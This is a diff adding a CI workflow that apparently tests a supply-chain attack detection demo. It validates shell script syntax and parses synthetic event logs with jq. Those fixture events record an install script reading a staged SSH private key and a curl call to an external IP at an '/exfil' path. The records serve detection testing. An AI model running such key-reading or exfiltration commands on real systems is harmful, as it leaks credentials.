@@ -1,0 +1,51 @@
+name: Integration & Replay Pipeline
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+jobs:
+  validate-demo-replay:
+    name: Validate Event Format & Replay Scripts
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Install dependencies (jq, bash)
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y jq bash
+
+      - name: Validate Demo Shell Scripts Syntax
+        run: |
+          bash -n demo/run_demo.sh
+          bash -n demo/supply_chain_demo.sh
+
+      - name: Generate Synthetic Events and Verify Schema Parsing
+        run: |
+          # Verify that the JSON structure required by event_viewer.html is valid JSON
+          cat << 'EOF' > /tmp/test_capture.jsonl
+          {"ts":1787047040118181744,"time":"2026-08-18T15:27:20.118181744+05:30","type":"exec","action":"exec","pid":41758,"ppid":25330,"uid":1000,"user":"runner","comm":"npm-install.sh","exe":"/usr/bin/bash","cmdline":"npm-install.sh","ancestry":[{"pid":25330,"comm":"zsh"}],"path":"/tmp/secrisk-demo/npm-install.sh"}
+          {"ts":1787047040120000000,"time":"2026-08-18T15:27:20.120000000+05:30","type":"file","action":"secret_read","pid":41759,"ppid":41758,"uid":1000,"user":"runner","comm":"cat","exe":"/usr/bin/cat","cmdline":"cat /tmp/secrisk-demo/home/.ssh/id_rsa","ancestry":[{"pid":41758,"comm":"npm-install.sh"}],"path":"/tmp/secrisk-demo/home/.ssh/id_rsa","flags":0}
+          {"ts":1787047040130000000,"time":"2026-08-18T15:27:20.130000000+05:30","type":"net","action":"connect","pid":41760,"ppid":41758,"uid":1000,"user":"runner","comm":"curl","exe":"/usr/bin/curl","cmdline":"curl http://104.20.23.154/exfil","ancestry":[{"pid":41758,"comm":"npm-install.sh"}],"saddr":"192.168.1.10","sport":45000,"daddr":"104.20.23.154","dport":80,"proto":6}
+          EOF
+
+          echo "Validating synthetic event JSON lines using jq..."
+          jq -e . /tmp/test_capture.jsonl > /dev/null
+
+          echo "Extracting attack chain via jq filter matching run_demo.sh..."
+          jq -r 'select(.comm == "npm-install.sh" or ([.ancestry[]?.comm] | index("npm-install.sh"))) | "\(.time[11:23]) \(.action | ascii_upcase) \(.path // "\(.daddr):\(.dport)")"' /tmp/test_capture.jsonl
